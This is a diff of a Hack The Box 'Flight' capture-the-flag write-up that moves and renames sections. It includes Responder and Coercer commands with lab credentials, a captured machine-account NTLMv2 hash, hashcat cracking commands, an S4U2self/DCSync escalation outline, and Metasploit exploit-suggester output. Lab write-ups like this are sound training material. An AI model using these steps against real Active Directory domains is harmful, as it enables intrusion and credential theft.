@@ -1102,7 +1102,7 @@ PS C:\Windows\system32> cat $env:USERPROFILE\desktop\user.txt
 ## From c.bum to iis apppool
 
 
-### ASPX webshell
+### Write ASPX webshell
 
 ```bash
 ┌──(bravosec㉿fsociety)-[~/htb/Flight]
@@ -1225,10 +1225,10 @@ User claims unknown.
 Kerberos support for Dynamic Access Control on this device has been disabled.
 ```
 
-**3 main ways to privilege escalate** :
+**3 main ways to escalate privilege in this case** :
 1. Abuse `SeImpersonatePrivilege`
-2. Request a `TGT` with `iis apppool\defaultapppool` then **DCSync** (In [Additional](#Privilege+escalation+with+machine+account+for+DC) section)
-3. (Not necessary) Coerce an auth to our machine then **ntlmrelay** to any machines that has **LDAP Signing** disabled in the domain (Abuse Methods - [thehackerrecipes](https://www.thehacker.recipes/ad/movement/ntlm/relay#abuse))
+2. Abuse **S4U2self** via **Microsoft Virtual Account** (`iis apppool\defaultapppool`) to get a TGT of machine account then impersonate domain admins via creating a silver ticket (In [Additional](#Additional#Privilege+escalation+via+S4U2self) section)
+3. (Not doable in this lab) Coerce an auth to our machine then **ntlmrelay** to any machines that has **LDAP Signing** disabled in the domain (Abuse Methods - [thehackerrecipes](https://www.thehacker.recipes/ad/movement/ntlm/relay#abuse))
 
 ### Abuse privilege tokens
 
@@ -1303,38 +1303,12 @@ PS C:\>
 # Additional
 ---
 
-
-## Coercer
-
-> https://github.com/p0dalirius/Coercer
-
-```bash
-sudo responder -A -I tun0 -v
-```
-
-```bash
-coercer coerce -l 10.10.16.30 -t flight.htb -u 'svc_apache' -p 'S@Ss!K@*t13' -v
-```
-
-![](/assets/obsidian/15552efd92ef8752b264cf50784f2a97.png)
-
-```bash
-[SMB] NTLMv2-SSP Client   : 10.129.228.120
-[SMB] NTLMv2-SSP Username : flight\G0$
-[SMB] NTLMv2-SSP Hash     : G0$::flight:855309d97302eafb:4EBDB596C65707241E1DD2E2393B47D1:0101000000000000002C25B6F535DA01FE45A69E06AF8485000000000200080050004A005600330001001E00570049004E002D005300470043003100520053005900460044003100460004003400570049004E002D00530047004300310052005300590046004400310046002E0050004A00560033002E004C004F00430041004C000300140050004A00560033002E004C004F00430041004C000500140050004A00560033002E004C004F00430041004C0007000800002C25B6F535DA01060004000200000008003000300000000000000000000000004000005CE573E2C7013E6F3367522C2932A4C0331BD7FD990711471B9252C9D582E0D90A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00330030000000000000000000
-```
-
-Default machine account password have `120+ characters` so it's unlikely crackable, and there's no other targets for me to relay to
-
-```bash
-hashcat G0_ntlm.hash /opt/wordlists/rockyou.txt
-hashcat G0_ntlm.hash /opt/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
-```
+## Privilege escalation via S4U2self
 
 
 ### Request Delegation TGT
 
-- `iis apppool\defaultapppool` is a service / [Microsoft Virtual Account](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-service-accounts) that authenticates as **Machine Account**
+- `iis apppool\defaultapppool` is a service / [Microsoft Virtual Account](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-service-accounts) that authenticates as a **Machine Account**
 - **Machine Account** for Domain Controller can abuse **S4U2self** to perform **DCSync**
 - **Service for User to Self (S4U2self)** allows a service to obtain a Service Ticket, on behalf of a user (called "principal"), to itself.
 
@@ -1393,6 +1367,7 @@ Impacket v0.12.0.dev1+20231114.165227.4b56c18 - Copyright 2023 Fortra
 [*] converting kirbi to ccache...
 [+] done
 ```
+
 
 ### Dcsync
 
@@ -1480,7 +1455,7 @@ G0$:des-cbc-md5:463d9edadc20e308
 [*] Cleaning up...
 ```
 
-### Shell via reverse ssh
+### Get a shell via reverse ssh
 
 ```bash
 ┌──(bravosec㉿fsociety)-[~/htb/Flight]
@@ -1496,9 +1471,6 @@ Copyright (C) Microsoft Corporation. All rights reserved.
 PS C:\> whoami
 flight\administrator
 ```
-
-
-## Privilege escalation with S4U2self
 
 
 ## Privilege escalation with metasploit exploit suggester
@@ -1545,3 +1517,32 @@ msf6 post(multi/recon/local_exploit_suggester) > exploit
  6   exploit/windows/local/cve_2022_21882_win32k                    Yes                      The target appears to be vulnerable.
  7   exploit/windows/local/cve_2022_21999_spoolfool_privesc         Yes                      The target appears to be vulnerable.
 ```
+
+
+## Coercer
+
+> https://github.com/p0dalirius/Coercer
+
+```bash
+sudo responder -A -I tun0 -v
+```
+
+```bash
+coercer coerce -l 10.10.16.30 -t flight.htb -u 'svc_apache' -p 'S@Ss!K@*t13' -v
+```
+
+![](/assets/obsidian/15552efd92ef8752b264cf50784f2a97.png)
+
+```bash
+[SMB] NTLMv2-SSP Client   : 10.129.228.120
+[SMB] NTLMv2-SSP Username : flight\G0$
+[SMB] NTLMv2-SSP Hash     : G0$::flight:855309d97302eafb:4EBDB596C65707241E1DD2E2393B47D1:0101000000000000002C25B6F535DA01FE45A69E06AF8485000000000200080050004A005600330001001E00570049004E002D005300470043003100520053005900460044003100460004003400570049004E002D00530047004300310052005300590046004400310046002E0050004A00560033002E004C004F00430041004C000300140050004A00560033002E004C004F00430041004C000500140050004A00560033002E004C004F00430041004C0007000800002C25B6F535DA01060004000200000008003000300000000000000000000000004000005CE573E2C7013E6F3367522C2932A4C0331BD7FD990711471B9252C9D582E0D90A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00330030000000000000000000
+```
+
+Default machine account password have `120+ characters` so it's unlikely crackable, and there's no other targets for me to relay to
+
+```bash
+hashcat G0_ntlm.hash /opt/wordlists/rockyou.txt
+hashcat G0_ntlm.hash /opt/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
+```
+
